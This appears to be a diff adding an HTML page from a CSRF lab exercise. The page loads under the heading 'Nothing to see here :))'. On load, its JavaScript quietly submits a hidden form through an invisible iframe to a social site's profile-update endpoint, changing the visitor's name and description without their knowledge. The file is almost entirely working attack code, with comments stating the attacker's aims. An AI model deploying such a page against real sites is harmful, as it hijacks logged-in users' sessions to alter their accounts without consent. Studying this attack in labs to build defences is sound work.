@@ -1,0 +1,37 @@
+
+<html>
+  <body>
+    <h1>  Nothing to see here :))  </h1>
+    <iframe name="hiddenFrame" width="0" height="0" border="0" style="display: none;"></iframe>
+
+    <script type="text/javascript">
+    function post(url,fields)
+    {
+        //create a <form> element.
+        var p = document.createElement("form");
+        //construct the form
+        p.action = url;
+        p.innerHTML = fields;
+        p.target = "hiddenFrame";
+        p.method = "post";
+        //append the form to the current page.
+        document.body.appendChild(p);
+        //submit the form
+        p.submit();
+    }
+    function csrf_hack()
+    {
+        var fields = "";
+        // The following are form entries that need to be filled out
+        // by attackers. The entries are made hidden, so the victim
+        // won’t be able to see them.
+        fields += "<input type='hidden' name='full_name' value='Charlie Miller'>";
+        fields += "<input type='hidden' name='description' value='n00bs g3t pwn3d'>";
+        var url = "http://now.share/update_profile";
+        post(url,fields);
+    }
+    // invoke csrf_hack() after the page is loaded.
+    window.onload = function() { csrf_hack();}
+    </script>
+  </body>
+</html>
